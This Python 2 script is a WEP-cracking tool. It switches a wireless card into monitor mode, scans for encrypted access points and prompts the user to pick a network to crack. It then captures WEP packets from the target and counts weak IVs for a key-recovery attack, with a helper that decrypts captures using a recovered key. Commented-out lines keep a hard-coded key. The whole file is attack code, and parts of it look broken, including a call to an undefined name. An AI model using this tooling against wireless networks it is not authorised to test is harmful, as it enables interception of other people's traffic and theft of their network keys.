#!/usr/bin/env python

from subprocess import Popen, PIPE

from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeResp, Dot11Elt, Dot11WEP, Dot11PacketList

from channelhopper import ChannelHopper
from interface import Interface
from sniffingthread import ThreadedSniffer
import wepcracker

__author__ = 'michael'
aps = []
wep_count = 0
iv_count = 0
pkt_lst = []
target_bssid = None


def decrypt_cap(file_name, key):
    enc = rdpcap(file_name)
    print 'SHOWWING ENC-------------------------------------------'
    enc.show()
    conf.wepkey = key
    dec = Dot11PacketList(enc).toEthernet()
    print 'SHOWWING DENC------------------------------------------'
    dec.show()
    return dec


def is_correct_key(pkt, key):
    oldsum = pkt.chksum

    conf.wepkey = key
    pkt.unwep()

    del pkt.chksum
    packet.__class__(str(pkt))

    newsum = pkt.chksum

    return oldsum == newsum


def change_channel(iface, channel):
    out = os.system('iwconfig %s channel %d' % (iface, channel))
    return out


def is_printable(s, codec='utf8'):
    try:
        s.decode(codec)
    except UnicodeDecodeError:
        return False
    else:
        return True


def insert_ap(pkt):
    # # Done in the lfilter param
    # if Dot11Beacon not in pkt and Dot11ProbeResp not in pkt:
    # return
    bssid = pkt[Dot11].addr3
    if bssid in aps:
        return
    p = pkt[Dot11Elt]
    cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
                      "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
    ssid, channel = None, None
    crypto = set()
    while isinstance(p, Dot11Elt):
        if p.ID == 0:
            ssid = str(p.info)
        elif p.ID == 3:
            try:
                channel = ord(p.info)
            except TypeError:
                return
        elif p.ID == 48:
            crypto.add("WPA2")
        elif p.ID == 221 and p.info.startswith('\x00P\xf2\x01\x01\x00'):
            crypto.add("WPA")
        p = p.payload
    if not crypto:
        if 'privacy' in cap:
            crypto.add("WEP")
        else:
            crypto.add("OPN")

    if len(ssid) < 1 or not is_printable(ssid) or ord(ssid[0]) == 0:
        ssid = 'HIDDEN'

    str_crypt = ' / '.join(crypto)
    found_ap = (ssid, bssid, channel, crypto)

    if found_ap not in aps:
        print '| {:^5d} | {:20s} | {:^20} | {:^2} | {:^10} |'.format(len(aps), ssid, bssid, channel, str_crypt)
        aps.append(found_ap)


def start_mon_mode(iface):
    os.system('ifconfig %s down' % iface)
    os.system('iwconfig %s mode monitor' % iface)
    os.system('ifconfig %s up' % iface)


def stop_mon_mode(iface):
    os.system('ifconfig %s down' % iface)
    os.system('iwconfig %s mode managed' % iface)
    os.system('ifconfig %s up' % iface)


def check_for_mon(lst):
    rtn = None
    for i in lst:
        if i.mode == 'Monitor':
            rtn = i
            break
    return rtn


def get_target(iface):
    conf.iface = iface
    hopper = ChannelHopper(iface=iface, oneitter=True)
    sniffer = ThreadedSniffer(prn=insert_ap, lfilter=lambda p: (
        (Dot11Beacon in p or Dot11ProbeResp in p) and 'privacy' in p.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
                                                                             "{Dot11ProbeResp:%Dot11ProbeResp.cap%}")
        .split('+')))

    print '-------------------------------------------------------------------------'
    print '| {:^5} | {:^20} | {:^20} | {:^2} | {:^10} |'.format('count', 'SSID', 'BSSID', 'ch', 'crypto')
    print '|-------|----------------------|----------------------|----|------------|'

    sniffer.start()
    hopper.start()
    hopper.join()
    sniffer.stop()
    hopper.stop()
    pick = input('\nchoose a network to crack (starting from 0) : ')
    return pick


def iwconfig():
    devnull = open(os.devnull, 'w')
    lst = []

    cmd = Popen(['iwconfig'], stdout=PIPE, stderr=devnull)
    for line in cmd.communicate()[0].split('\n\n'):
        tmpiface = Interface(None, None, None, None)
        line = line.strip()

        if len(line) == 0:
            continue

        ifname = re.search('^([A-Za-z0-9]+)', line)
        ifessid = re.search('ESSID:"([A-Za-z0-9]+)"', line)
        ifmode = re.search('Mode:([A-Za-z]+)', line)
        ifbssid = re.search('Access Point: ([0-9:A-F]+)', line)

        if ifname is not None:
            tmpiface.name = ifname.group(1)

            if ifessid is not None:
                tmpiface.essid = ifessid.group(1)

            if ifmode is not None:
                tmpiface.mode = ifmode.group(1)

            if ifbssid is not None:
                tmpiface.bssid = ifbssid.group(1)

            lst.append(tmpiface)

    devnull.close()
    return lst


def pkt_collector(pkt):
    global pkt_lst, wep_count, iv_count
    wep_pkt = pkt.getlayer(Dot11WEP)

    # if wep_pkt:
    #     print pkt.show
    #     return

    if wep_pkt and (pkt.addr1 == target_bssid or pkt.addr2 == target_bssid or pkt.addr3 == target_bssid):
        pkt_lst.append((wep_pkt.iv, wep_pkt.wepdata))
        readable_iv = [ord(char) for char in wep_pkt.iv]
        wep_count += 1

        if wepcracker.weak_iv(readable_iv, 13) >= 0:
            iv_count += 1
            print 'weak iv: %s\tWEP count: %d\tIV count: %d' % (str(readable_iv), wep_count, iv_count)


def test(pkt):
    global wep_count, iv_count
    wep_pkt = pkt.getlayer(Dot11WEP)
    if wep_pkt:
        wep_count += 1

        # print '\n' + str(pkt.show2)
        # print '\naddr1: ' + pkt.addr1
        #print 'addr2: ' + pkt.addr2
        #print 'addr3: ' + pkt.addr3
        #print 'iv: ' + wep_pkt.iv
        #print 'wepdata[0]: ' + wep_pkt.wepdata[0]
        readable_iv = [ord(char) for char in wep_pkt.iv]
        # Shane: using 128bit WEP so key size is 13
        if wepcracker.weak_iv(readable_iv, 13) >= 0:
            iv_count += 1
            print 'weak iv: %s\tWEP count: %d\tIV count: %d' % (str(readable_iv), wep_count, iv_count)
            #print '\n########\naddr1: %s, addr2: %s addr3: %s, iv: %s\n webdata: %s\n########\n' % (addr1.group(1), addr2.group(1), addr3.group(1), iv.group(1), webdata.group(1))


def main():
    global aplist
    global aps
    global target_bssid
    global wep_count
    global pkt_lst

    interfaces = iwconfig()
    foundmon = check_for_mon(interfaces)
    pick = None

    if foundmon is not None:
        print foundmon.tostring()
        ans = None
        while ans != 'y' and ans != 'n':
            ans = raw_input('Found an iface already in mon mode would you like to use it? (y/n) : ')
            if ans == 'y':
                pick = foundmon.name

    if pick is None:
        for i in interfaces:
            print i.tostring()

        pick = input('Pick one (starting from 0): ')
        pick = interfaces[pick].name
        print 'putting %s in mon mode' % pick
        start_mon_mode(pick)

    conf.iface = pick

    network = get_target(iface=pick)
    # (ssid, bssid, channel, crypto) is the format
    print 'you picked: ' + str(aps[network][0])
    target_bssid = aps[network][1]
    change_channel(pick, aps[network][2])
    sniffer = ThreadedSniffer(prn=pkt_collector)
    sniffer.start()

    while wep_count < 1:
        time.sleep(1)

    sniffer.stop()

    print 'wep count: %d' % wep_count
    print 'pkt_lst: ' + str(pkt_lst)

    print 'Stopping mon mode on %s' % str(pick)
    stop_mon_mode(pick)


if __name__ == '__main__':
    try:
        main()
        #decrypt_cap('/home/michael/homeagain-01.cap', '\xF2\xF5\xA2\x2A\xD9')
        #enc = rdpcap('/home/michael/homeagain-01.cap')
        #print is_correct_key(enc[0], '0000000000')
        #print is_correct_key(enc[0], '\xF2\xF5\xA2\x2A\xD9')
    except KeyboardInterrupt:
        pass
